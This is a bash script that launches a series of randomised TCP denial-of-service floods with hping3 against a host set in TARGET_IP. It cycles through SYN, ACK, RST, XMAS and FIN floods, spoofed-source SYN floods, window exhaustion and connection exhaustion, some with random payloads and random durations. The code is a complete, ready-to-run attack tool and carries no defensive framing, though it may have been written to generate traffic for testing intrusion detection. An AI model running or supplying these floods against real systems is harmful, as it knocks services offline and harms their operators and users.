#!/bin/bash

# Ensure TARGET_IP is set
if [ -z "$TARGET_IP" ]; then
    echo "❌ Error: TARGET_IP is not set. Please set the target IP before running the script."
    exit 1
fi

# Create a random payload (only for attacks that send payload)
create_payload() {
    PAYLOAD_SIZE=$((RANDOM % 100 + 50))  # Payload size between 50 to 150 bytes
    dd if=/dev/urandom bs=1 count=$PAYLOAD_SIZE of=/tmp/payload.bin &>/dev/null
    echo "Payload created with size: $PAYLOAD_SIZE bytes"
}

# Function to execute an attack
execute_attack() {
    local TARGET_PORT=$((RANDOM % 65535 + 1))  # Random port (1-65535)
    
    # Randomly select an attack type
    local ATTACK_TYPE=$((RANDOM % 8))  
    local ATTACK_CMD=""
    local USE_PAYLOAD=false

    # Randomly decide whether to use a payload or not (50% chance)
    if [ $((RANDOM % 2)) -eq 0 ]; then
        USE_PAYLOAD=true
        create_payload  # Generate a random payload
    fi

    # Define attack commands with or without payload
    case $ATTACK_TYPE in
        0) ATTACK_CMD="hping3 -S --flood -p $TARGET_PORT $TARGET_IP" ;;  # SYN Flood
        1) ATTACK_CMD="hping3 -A --flood -p $TARGET_PORT $TARGET_IP" ;;  # ACK Flood
        2) ATTACK_CMD="hping3 -R --flood -p $TARGET_PORT $TARGET_IP" ;;  # RST Flood
        3) ATTACK_CMD="hping3 -F -P -U --flood -p $TARGET_PORT $TARGET_IP" ;;  # XMAS Flood
        4) ATTACK_CMD="hping3 -F --flood -p $TARGET_PORT $TARGET_IP" ;;  # FIN Flood
        5) ATTACK_CMD="hping3 -S -p $TARGET_PORT --rand-source --flood $TARGET_IP" ;;  # Random SYN Flood
        6) ATTACK_CMD="hping3 -S -p $TARGET_PORT --tcp-mss 1 --flood $TARGET_IP" ;;  # TCP Window Exhaustion
        7) ATTACK_CMD="for i in {1..5000}; do hping3 -S -p $TARGET_PORT -c 1 $TARGET_IP; done" ;;  # Connection Exhaustion
    esac

    # If the payload should be used, modify the attack command to include it
    if [ "$USE_PAYLOAD" = true ]; then
        ATTACK_CMD="for i in {1..5000}; do hping3 -S -p $TARGET_PORT -c 1 $TARGET_IP -d $(cat /tmp/payload.bin | wc -c) -E /tmp/payload.bin; done"
    fi

    # If the attack uses --rand-source, set the duration to be 0-5 seconds
    if [[ "$ATTACK_CMD" == *"--rand-source"* ]]; then
        ATTACK_DURATION=$((RANDOM % 6))  # Duration between 0 and 5 seconds
    else
        # Random attack duration: choose between three ranges (10-50, 50-70, 70-120)
        local RANGE_SELECTION=$((RANDOM % 3))
        
        case $RANGE_SELECTION in
            0) ATTACK_DURATION=$((10 + RANDOM % 41)) ;;  # 10-50 seconds
            1) ATTACK_DURATION=$((50 + RANDOM % 21)) ;;  # 50-70 seconds
            2) ATTACK_DURATION=$((70 + RANDOM % 51)) ;;  # 70-120 seconds
        esac
    fi

    echo "🕒 Attack Duration: $ATTACK_DURATION seconds"

    # Start attack in the background
    timeout $ATTACK_DURATION bash -c "$ATTACK_CMD" &

    # Wait for attack duration before stopping
    sleep $ATTACK_DURATION
    
    # Kill the attack
    kill $(jobs -p) 2>/dev/null  

    echo "⏳ Attack interrupted after $ATTACK_DURATION seconds."

    # Random delay before the next attack (6 - 15 seconds)
    local SLEEP_TIME=$((6 + RANDOM % 10))
    echo "⏳ Waiting $SLEEP_TIME seconds before starting the next attack..."
    sleep $SLEEP_TIME
}

# Main attack loop
for i in {1..5}; do
    execute_attack
done

echo "⚡ All attacks completed."

